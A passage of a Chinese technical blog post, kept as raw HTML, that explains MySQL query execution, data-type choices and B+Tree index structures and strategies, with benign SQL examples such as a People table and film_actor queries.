API</code>。查询过程中的每一张表由一个<code>handler</code>实例表示。实际上，MySQL在查询优化阶段就为每一张表创建了一个<code>handler</code>实例，优化器可以根据这些实例的接口来获取表的相关信息，包括表的所有列名、索引统计信息等。存储引擎接口提供了非常丰富的功能，但其底层仅有几十个接口，这些接口像搭积木一样完成了一次查询的大部分操作。</p>\n<h4>返回结果给客户端</h4>\n<p>查询执行的最后一个阶段就是将结果返回给客户端。即使查询不到数据，MySQL仍然会返回这个查询的相关信息，比如该查询影响到的行数以及执行时间等等。</p>\n<p>如果查询缓存被打开且这个查询可以被缓存，MySQL也会将结果存放到缓存中。</p>\n<p>结果集返回客户端是一个增量且逐步返回的过程。有可能MySQL在生成第一条结果时，就开始向客户端逐步返回结果集了。这样服务端就无须存储太多结果而消耗过多内存，也可以让客户端第一时间获得返回结果。需要注意的是，结果集中的每一行都会以一个满足①中所描述的通信协议的数据包发送，再通过TCP协议进行传输，在传输过程中，可能对MySQL的数据包进行缓存然后批量发送。</p>\n<p>回头总结一下MySQL整个查询执行过程，总的来说分为6个步骤：</p>\n<ol>\n<li>客户端向MySQL服务器发送一条查询请求</li>\n<li>服务器首先检查查询缓存，如果命中缓存，则立刻返回存储在缓存中的结果。否则进入下一阶段</li>\n<li>服务器进行SQL解析、预处理、再由优化器生成对应的执行计划</li>\n<li>MySQL根据执行计划，调用存储引擎的API来执行查询</li>\n<li>将结果返回给客户端，同时缓存查询结果</li>\n</ol>\n<h3>性能优化建议</h3>\n<p>看了这么多，你可能会期待给出一些优化手段，是的，下面会从3个不同方面给出一些优化建议。但请等等，还有一句忠告要先送给你：<strong>不要听信你看到的关于优化的“绝对真理”，包括本文所讨论的内容，而应该是在实际的业务场景下通过测试来验证你关于执行计划以及响应时间的假设</strong>。</p>\n<h4>Scheme设计与数据类型优化</h4>\n<p>选择数据类型只要遵循<strong>小而简单</strong>的原则就好，越小的数据类型通常会更快，占用更少的磁盘、内存，处理时需要的CPU周期也更少。越简单的数据类型在计算时需要更少的CPU周期，比如，整型就比字符操作代价低，因而会使用整型来存储ip地址，使用<code>DATETIME</code>来存储时间，而不是使用字符串。</p>\n<p>这里总结几个可能容易理解错误的技巧：</p>\n<ol>\n<li>通常来说把可为<code>NULL</code>的列改为<code>NOT NULL</code>不会对性能提升有多少帮助，只是如果计划在列上创建索引，就应该将该列设置为<code>NOT NULL</code>。</li>\n<li>对整数类型指定宽度，比如<code>INT(11)</code>，没有任何卵用。<code>INT</code>使用32位（4个字节）存储空间，那么它的表示范围已经确定，所以<code>INT(1)</code>和<code>INT(20)</code>对于存储和计算是相同的。</li>\n<li><code>UNSIGNED</code>表示不允许负值，大致可以使正数的上限提高一倍。比如<code>TINYINT</code>存储范围是-128 ~ 127，而<code>UNSIGNED TINYINT</code>存储的范围却是0 – 255。</li>\n<li>通常来讲，没有太大的必要使用<code>DECIMAL</code>数据类型。即使是在需要存储财务数据时，仍然可以使用<code>BIGINT</code>。比如需要精确到万分之一，那么可以将数据乘以一百万然后使用<code>BIGINT</code>存储。这样可以避免浮点数计算不准确和<code>DECIMAL</code>精确计算代价高的问题。</li>\n<li><code>TIMESTAMP</code>使用4个字节存储空间，<code>DATETIME</code>使用8个字节存储空间。因而，<code>TIMESTAMP</code>只能表示1970 – 2038年，比<code>DATETIME</code>表示的范围小得多，而且<code>TIMESTAMP</code>的值因时区不同而不同。</li>\n<li>大多数情况下没有使用枚举类型的必要，其中一个缺点是枚举的字符串列表是固定的，添加和删除字符串（枚举选项）必须使用<code>ALTER TABLE</code>（如果只只是在列表末尾追加元素，不需要重建表）。</li>\n<li>schema的列不要太多。原因是存储引擎的API工作时需要在服务器层和存储引擎层之间通过行缓冲格式拷贝数据，然后在服务器层将缓冲内容解码成各个列，这个转换过程的代价是非常高的。如果列太多而实际使用的列又很少的话，有可能会导致CPU占用过高。</li>\n<li>大表<code>ALTER TABLE</code>非常耗时，MySQL执行大部分修改表结果操作的方法是用新的结构创建一个张空表，从旧表中查出所有的数据插入新表，然后再删除旧表。尤其当内存不足而表又很大，而且还有很大索引的情况下，耗时更久。当然有一些奇技淫巧可以解决这个问题，有兴趣可自行查阅。</li>\n</ol>\n<h4>创建高性能索引</h4>\n<p>索引是提高MySQL查询性能的一个重要途径，但过多的索引可能会导致过高的磁盘使用率以及过高的内存占用，从而影响应用程序的整体性能。应当尽量避免事后才想起添加索引，因为事后可能需要监控大量的SQL才能定位到问题所在，而且添加索引的时间肯定是远大于初始添加索引所需要的时间，可见索引的添加也是非常有技术含量的。</p>\n<p>接下来将向你展示一系列创建高性能索引的策略，以及每条策略其背后的工作原理。但在此之前，先了解与索引相关的一些算法和数据结构，将有助于更好的理解后文的内容。</p>\n<h5>索引相关的数据结构和算法</h5>\n<p>通常我们所说的索引是指<code>B-Tree</code>索引，它是目前关系型数据库中查找数据最为常用和有效的索引，大多数存储引擎都支持这种索引。使用<code>B-Tree</code>这个术语，是因为MySQL在<code>CREATE TABLE</code>或其它语句中使用了这个关键字，但实际上不同的存储引擎可能使用不同的数据结构，比如InnoDB就是使用的<code>B+Tree</code>。</p>\n<p><code>B+Tree</code>中的B是指<code>balance</code>，意为平衡。需要注意的是，B+树索引并不能找到一个给定键值的具体行，它找到的只是被查找数据行所在的页，接着数据库会把页读入到内存，再在内存中进行查找，最后得到要查找的数据。</p>\n<p>在介绍<code>B+Tree</code>前，先了解一下二叉查找树，它是一种经典的数据结构，其左子树的值总是小于根的值，右子树的值总是大于根的值，如下图①。如果要在这课树中查找值为5的记录，其大致流程：先找到根，其值为6，大于5，所以查找左子树，找到3，而5大于3，接着找3的右子树，总共找了3次。同样的方法，如果查找值为8的记录，也需要查找3次。所以二叉查找树的平均查找次数为(3 + 3 + 3 + 2 + 2 + 1) / 6 = 2.3次，而顺序查找的话，查找值为2的记录，仅需要1次，但查找值为8的记录则需要6次，所以顺序查找的平均查找次数为：(1 + 2 + 3 + 4 + 5 + 6) / 6 = 3.3次，因此大多数情况下二叉查找树的平均查找速度比顺序查找要快。</p>\n<div>\n<div>\n<div> <img src=\"http://wx2.sinaimg.cn/mw690/63918611gy1frnqlpnol6j20h606gglv.jpg\"></div>\n<div><img></div>\n</div>\n<div style=\"text-align: center\">二叉查找树和平衡二叉树</div>\n</div>\n<p>由于二叉查找树可以任意构造，同样的值，可以构造出如图②的二叉查找树，显然这棵二叉树的查询效率和顺序查找差不多。若想二叉查找数的查询性能最高，需要这棵二叉查找树是平衡的，也即平衡二叉树（AVL树）。</p>\n<p>平衡二叉树首先需要符合二叉查找树的定义，其次必须满足任何节点的两个子树的高度差不能大于1。显然图②不满足平衡二叉树的定义，而图①是一课平衡二叉树。平衡二叉树的查找性能是比较高的（性能最好的是最优二叉树），查询性能越好，维护的成本就越大。比如图①的平衡二叉树，当用户需要插入一个新的值9的节点时，就需要做出如下变动。</p>\n<div>\n<div>\n<div> <img src=\"http://wx1.sinaimg.cn/mw690/63918611gy1frnqlq46oqj20ey069q39.jpg\"></div>\n<div><img></div>\n</div>\n<div style=\"text-align: center\">平衡二叉树旋转</div>\n</div>\n<p>通过一次左旋操作就将插入后的树重新变为平衡二叉树是最简单的情况了，实际应用场景中可能需要旋转多次。至此我们可以考虑一个问题，平衡二叉树的查找效率还不错，实现也非常简单，相应的维护成本还能接受，为什么MySQL索引不直接使用平衡二叉树？</p>\n<p>随着数据库中数据的增加，索引本身大小随之增加，不可能全部存储在内存中，因此索引往往以索引文件的形式存储的磁盘上。这样的话，索引查找过程中就要产生磁盘I/O消耗，相对于内存存取，I/O存取的消耗要高几个数量级。可以想象一下一棵几百万节点的二叉树的深度是多少？如果将这么大深度的一颗二叉树放磁盘上，每读取一个节点，需要一次磁盘的I/O读取，整个查找的耗时显然是不能够接受的。那么如何减少查找过程中的I/O存取次数？</p>\n<p>一种行之有效的解决方法是减少树的深度，将二叉树变为m叉树（多路搜索树），而<code>B+Tree</code>就是一种多路搜索树。理解<code>B+Tree</code>时，只需要理解其最重要的两个特征即可：第一，所有的关键字（可以理解为数据）都存储在叶子节点（<code>Leaf Page</code>），非叶子节点（<code>Index Page</code>）并不存储真正的数据，所有记录节点都是按键值大小顺序存放在同一层叶子节点上。其次，所有的叶子节点由指针连接。如下图为高度为2的简化了的<code>B+Tree</code>。</p>\n<div>\n<div>\n<div> <img src=\"http://wx4.sinaimg.cn/mw690/63918611gy1frnqlqkcsmj20jg04ymx9.jpg\"></div>\n<div><img></div>\n</div>\n<div style=\"text-align: center\">简化B+Tree</div>\n</div>\n<p>怎么理解这两个特征？MySQL将每个节点的大小设置为一个页的整数倍（原因下文会介绍），也就是在节点空间大小一定的情况下，每个节点可以存储更多的内结点，这样每个结点能索引的范围更大更精确。所有的叶子节点使用指针链接的好处是可以进行区间访问，比如上图中，如果查找大于20而小于30的记录，只需要找到节点20，就可以遍历指针依次找到25、30。如果没有链接指针的话，就无法进行区间查找。这也是MySQL使用<code>B+Tree</code>作为索引存储结构的重要原因。</p>\n<p>MySQL为何将节点大小设置为页的整数倍，这就需要理解磁盘的存储原理。磁盘本身存取就比主存慢很多，在加上机械运动损耗（特别是普通的机械硬盘），磁盘的存取速度往往是主存的几百万分之一，为了尽量减少磁盘I/O，磁盘往往不是严格按需读取，而是每次都会预读，即使只需要一个字节，磁盘也会从这个位置开始，顺序向后读取一定长度的数据放入内存，预读的长度一般为页的整数倍。</p>\n<blockquote><p>页是计算机管理存储器的逻辑块，硬件及OS往往将主存和磁盘存储区分割为连续的大小相等的块，每个存储块称为一页（许多OS中，页的大小通常为4K）。主存和磁盘以页为单位交换数据。当程序要读取的数据不在主存中时，会触发一个缺页异常，此时系统会向磁盘发出读盘信号，磁盘会找到数据的起始位置并向后连续读取一页或几页载入内存中，然后一起返回，程序继续运行。</p></blockquote>\n<p>MySQL巧妙利用了磁盘预读原理，将一个节点的大小设为等于一个页，这样每个节点只需要一次I/O就可以完全载入。为了达到这个目的，每次新建节点时，直接申请一个页的空间，这样就保证一个节点物理上也存储在一个页里，加之计算机存储分配都是按页对齐的，就实现了读取一个节点只需一次I/O。假设<code>B+Tree</code>的高度为h，一次检索最多需要<code>h-1</code>次I/O（根节点常驻内存），复杂度O(h) = O(logmN)。实际应用场景中，M通常较大，常常超过100，因此树的高度一般都比较小，通常不超过3。</p>\n<p>最后简单了解下<code>B+Tree</code>节点的操作，在整体上对索引的维护有一个大概的了解，虽然索引可以大大提高查询效率，但维护索引仍要花费很大的代价，因此合理的创建索引也就尤为重要。</p>\n<p>仍以上面的树为例，我们假设每个节点只能存储4个内节点。首先要插入第一个节点28，如下图所示。</p>\n<div>\n<div>\n<div> <img src=\"http://wx4.sinaimg.cn/mw690/63918611gy1frnqlqysrpj20jg05aaa4.jpg\"></div>\n<div><img></div>\n</div>\n<div style=\"text-align: center\">leaf page和index page都没有满</div>\n</div>\n<p>接着插入下一个节点70，在Index Page中查询后得知应该插入到50 – 70之间的叶子节点，但叶子节点已满，这时候就需要进行也分裂的操作，当前的叶子节点起点为50，所以根据中间值来拆分叶子节点，如下图所示。</p>\n<div>\n<div>\n<div></div>\n<div><img><img src=\"http://wx2.sinaimg.cn/mw690/63918611gy1frnqlrek5aj20jg0bft96.jpg\"></div>\n</div>\n<div style=\"text-align: center\">Leaf Page拆分</div>\n</div>\n<p>最后插入一个节点95，这时候Index Page和Leaf Page都满了，就需要做两次拆分，如下图所示。</p>\n<div>\n<div>\n<div> <img src=\"http://wx4.sinaimg.cn/mw690/63918611gy1frnqlrt7gcj20jg0ccgms.jpg\"></div>\n<div><img></div>\n</div>\n<div style=\"text-align: center\">Leaf Page与Index Page拆分</div>\n</div>\n<p>拆分后最终形成了这样一颗树。</p>\n<div>\n<div>\n<div> <img src=\"http://wx4.sinaimg.cn/mw690/63918611gy1frnqlsibq4j20jg04iaa4.jpg\"></div>\n<div><img></div>\n</div>\n<div style=\"text-align: center\">最终树</div>\n</div>\n<p><code>B+Tree</code>为了保持平衡，对于新插入的值需要做大量的拆分页操作，而页的拆分需要I/O操作，为了尽可能的减少页的拆分操作，<code>B+Tree</code>也提供了类似于平衡二叉树的旋转功能。当Leaf Page已满但其左右兄弟节点没有满的情况下，<code>B+Tree</code>并不急于去做拆分操作，而是将记录移到当前所在页的兄弟节点上。通常情况下，左兄弟会被先检查用来做旋转操作。就比如上面第二个示例，当插入70的时候，并不会去做页拆分，而是左旋操作。</p>\n<div>\n<div>\n<div> <img src=\"http://wx4.sinaimg.cn/mw690/63918611gy1frnqlstvi1j20jg0dq3yz.jpg\"></div>\n<div><img></div>\n</div>\n<div style=\"text-align: center\">左旋操作</div>\n</div>\n<p>通过旋转操作可以最大限度的减少页分裂，从而减少索引维护过程中的磁盘的I/O操作，也提高索引维护效率。需要注意的是，删除节点跟插入节点类似，仍然需要旋转和拆分操作，这里就不再说明。</p>\n<h5>高性能策略</h5>\n<p>通过上文，相信你对<code>B+Tree</code>的数据结构已经有了大致的了解，但MySQL中索引是如何组织数据的存储呢？以一个简单的示例来说明，假如有如下数据表：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa14398cde176906983\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nCREATE TABLE People(\r\n    last_name varchar(50) not null,\r\n    first_name varchar(50) not null,\r\n    dob date not null,\r\n    gender enum(`m`,`f`) not null,\r\n    key(last_name,first_name,dob)\r\n);\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398cde176906983-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398cde176906983-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398cde176906983-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398cde176906983-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398cde176906983-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398cde176906983-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398cde176906983-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398cde176906983-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa14398cde176906983-1\"><span class=\"crayon-e\">CREATE </span><span class=\"crayon-e\">TABLE </span><span class=\"crayon-e\">People</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398cde176906983-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">last_name </span><span class=\"crayon-e\">varchar</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">50</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa14398cde176906983-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">first_name </span><span class=\"crayon-e\">varchar</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">50</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398cde176906983-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">dob </span><span class=\"crayon-e\">date </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa14398cde176906983-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">gender </span><span class=\"crayon-t\">enum</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">m</span><span class=\"crayon-sy\">`</span><span class=\"crayon-sy\">,</span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">f</span><span class=\"crayon-sy\">`</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398cde176906983-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">key</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">last_name</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">first_name</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">dob</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa14398cde176906983-7\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398cde176906983-8\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p>对于表中每一行数据，索引中包含了last_name、first_name、dob列的值，下图展示了索引是如何组织数据存储的。</p>\n<div>\n<div>\n<div> <img src=\"http://wx3.sinaimg.cn/mw690/63918611gy1frnqlta58nj20jg03uglt.jpg\"></div>\n<div><img></div>\n</div>\n<div style=\"text-align: center\">索引如何组织数据存储，来自：高性能MySQL</div>\n</div>\n<p>可以看到，索引首先根据第一个字段来排列顺序，当名字相同时，则根据第三个字段，即出生日期来排序，正是因为这个原因，才有了索引的“最左原则”。</p>\n<h6>1、MySQL不会使用索引的情况：非独立的列</h6>\n<p>“独立的列”是指索引列不能是表达式的一部分，也不能是函数的参数。比如：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa14398cf2833488370\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nselect * from where id + 1 = 5\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398cf2833488370-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398cf2833488370-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa14398cf2833488370-1\"><span class=\"crayon-e \">select *</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">from </span><span class=\"crayon-e\">where </span><span class=\"crayon-v\">id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398cf2833488370-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>我们很容易看出其等价于 id = 4，但是MySQL无法自动解析这个表达式，使用函数是同样的道理。</p>\n<h6>2、前缀索引</h6>\n<p>如果列很长，通常可以索引开始的部分字符，这样可以有效节约索引空间，从而提高索引效率。</p>\n<h6>3、多列索引和索引顺序</h6>\n<p>在多数情况下，在多个列上建立独立的索引并不能提高查询性能。理由非常简单，MySQL不知道选择哪个索引的查询效率更好，所以在老版本，比如MySQL5.0之前就会随便选择一个列的索引，而新的版本会采用合并索引的策略。举个简单的例子，在一张电影演员表中，在actor_id和film_id两个列上都建立了独立的索引，然后有如下查询：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa14398cf7605865257\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nselect film_id,actor_id from film_actor where actor_id = 1 or film_id = 1\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398cf7605865257-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398cf7605865257-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa14398cf7605865257-1\"><span class=\"crayon-e\">select </span><span class=\"crayon-v\">film_id</span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">actor_id </span><span class=\"crayon-e\">from </span><span class=\"crayon-e\">film_actor </span><span class=\"crayon-e\">where </span><span class=\"crayon-v\">actor_id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">film_id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398cf7605865257-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>老版本的MySQL会随机选择一个索引，但新版本做如下的优化：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa14398cfa259757501\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nselect film_id,actor_id from film_actor where actor_id = 1 \r\nunion all \r\nselect film_id,actor_id from film_actor where film_id = 1 and actor_id &lt;&gt; 1\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398cfa259757501-1\">1</div><div class=\"crayon-num crayon-striped-num\" 